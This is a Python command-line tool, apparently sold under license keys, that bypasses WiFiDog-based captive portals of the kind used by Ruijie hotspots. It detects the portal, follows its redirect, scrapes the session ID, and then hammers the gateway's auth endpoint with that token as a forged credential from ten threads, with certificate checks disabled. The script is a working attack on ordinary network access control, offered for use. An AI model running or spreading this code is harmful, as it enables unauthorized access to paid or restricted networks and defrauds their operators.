import os
import subprocess
import sys
import platform
import hashlib
import requests
import re
import urllib3
import time
import threading
import random
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIG & PATHS
# ===============================
KEY_URL = "https://raw.githubusercontent.com/tmmt6132-coder/Bypass/main/keys.txt"
LOCAL_KEY_FILE = ".license_key"

# ===============================
# NEW COLOR SYSTEM (R/G/B/Y)
# ခရမ်းရောင် လုံးဝ မပါဝင်ပါ
# ===============================
R = "\033[31m"  # Red (Error)
G = "\033[32m"  # Green (Success)
C = "\033[36m"  # Cyan (Sub-titles, HWID)
Y = "\033[33m"  # Yellow (Wait/Status)
W = "\033[37m"  # White (Text)
B = "\033[34m"  # Dark Blue (Banners, Separators)
Bold = "\033[1m"
RESET = "\033[0m"

stop_event = threading.Event()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_hwid():
    id_str = platform.node() + platform.machine() + platform.version()
    return hashlib.md5(id_str.encode()).hexdigest()[:12].upper()

# ===============================
# UI COMPONENTS
# ===============================
def sexy_banner():
    clear_screen()
    # Banner ကို အပြာရင့် (Blue) နှင့် Title ကို Cyan ဖြင့် ပြောင်းထားသည်
    print(f"""{B}
{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{C}   ____             _ _            ____                                
   |  _ \ _   _(_) (_) ___      | __ ) _   _ _ __   __ _ ___ ___ 
   | |_) | | | | | | |/ _ \_____|  _ \| | | | '_ \ / _` / __/ __|
   |  _ <| |_| | | | |  __/_____| |_) | |_| | |_) | (_| \__ \__ \\
   |_| \_\\\\__,_|_|_/ |\___|     |____/ \__, | .__/ \__,_|___/___/
                |__/                   |___/|_|                  
{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{Y}   [+] System: {W}Locked & Turbo {Y}  [+] Dev: {W}TMMT-Coder {Y} [+] Build: {W}v3.0{RESET}
{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}""")

def update_status(msg, color=W):
    # စာတန်းတွေ အောက်ကို ဆင်းမသွားအောင် တစ်ကြောင်းတည်းမှာ ပြပေးသည်
    sys.stdout.write(f"\r{Y}[{W}STATUS{Y}] {color}{msg}{' ' * 30}{RESET}")
    sys.stdout.flush()

# ===============================
# AUTH SYSTEM
# ===============================
def validate_key():
    hwid = get_hwid()
    saved_key = ""

    if os.path.exists(LOCAL_KEY_FILE):
        with open(LOCAL_KEY_FILE, "r") as f:
            saved_key = f.read().strip()

    if not saved_key:
        print(f"\n{C}[ID] DEVICE-HWID: {W}{hwid}{RESET}")
        user_key = input(f"{C}[?] ENTER LICENSE KEY: {W}").strip()
    else:
        user_key = saved_key

    try:
        update_status("Connecting to Server...", C)
        response = requests.get(KEY_URL, timeout=10)
        key_data = response.text.splitlines()
        
        for line in key_data:
            if ":" in line:
                k, expiry, lock = (line.split(":") + ["FREE"]*3)[:3]
                if k.strip() == user_key:
                    if datetime.strptime(expiry.strip(), "%Y-%m-%d") < datetime.now():
                        print(f"\n{R}[!] KEY EXPIRED!{RESET}")
                        if os.path.exists(LOCAL_KEY_FILE): os.remove(LOCAL_KEY_FILE)
                        sys.exit()
                    if lock.strip() != "FREE" and lock.strip() != hwid:
                        print(f"\n{R}[!] HARDWARE LOCK MISMATCH!{RESET}")
                        print(f"{C}[#] THIS KEY IS LOCKED TO ANOTHER DEVICE{RESET}")
                        sys.exit()
                    
                    with open(LOCAL_KEY_FILE, "w") as f: f.write(user_key)
                    print(f"\n{G}[✓] ACCESS GRANTED! {W}(Expires: {expiry}){RESET}\n")
                    time.sleep(1.5)
                    return True
        
        print(f"\n{R}[!] INVALID KEY ID!{RESET}")
        if os.path.exists(LOCAL_KEY_FILE): os.remove(LOCAL_KEY_FILE)
        sys.exit()
    except Exception as e:
        print(f"\n{R}[!] SERVER ERROR: {e}{RESET}")
        sys.exit()

# ===============================
# CORE ENGINE
# ===============================
def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=2).status_code == 200
    except: return False

def turbo_pulse(auth_link, sid):
    while not stop_event.is_set():
        try:
            requests.get(auth_link, timeout=5, verify=False)
        except: break
        # Delay ကို ပိုမြန်အောင် လုပ်ထားသည်
        time.sleep(random.uniform(0.01, 0.05))

def start_process():
    sexy_banner()
    validate_key()
    sexy_banner() # Key အောင်မြင်ပြီးရင် UI ပြန်ရှင်းရန်

    while not stop_event.is_set():
        try:
            update_status("Monitoring Network Connectivity...", Y)
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)

            if r.status_code == 204 and check_real_internet():
                update_status("INTERNET IS ACTIVE (Waiting...)", G)
                time.sleep(10)
                continue

            update_status("Captive Portal Detected! Bypassing...", C)
            portal_url = r.url
            
            # Smart Redirect Handling
            r1 = requests.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = requests.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r2.text)
                sid = sid_match.group(1) if sid_match else "UNKNOWN"

            if sid != "UNKNOWN":
                update_status(f"SID CAPTURED: {sid} | Bypassing Portal...", G)
                params = parse_qs(urlparse(portal_url).query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                # sid ကို token အဖြစ်သုံးသည်
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

                for _ in range(10): # Threads တိုးထားသည်
                    threading.Thread(target=turbo_pulse, args=(auth_link, sid), daemon=True).start()

                # Bypass အောင်မြင်သွားပြီဆိုတာကို တည်ငြိမ်စွာပြရန်
                while check_real_internet():
                    update_status(f"BYPASS ACTIVE | SID: {sid} | [ONLINE]", G)
                    time.sleep(10)
            else:
                update_status("SID Extraction Failed! Retrying...", R)
                time.sleep(3)

        except Exception:
            update_status("Network Error! Reconnecting...", R)
            time.sleep(5)

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n\n{R}[!] ENGINE SHUTDOWN BY USER.{RESET}")
        
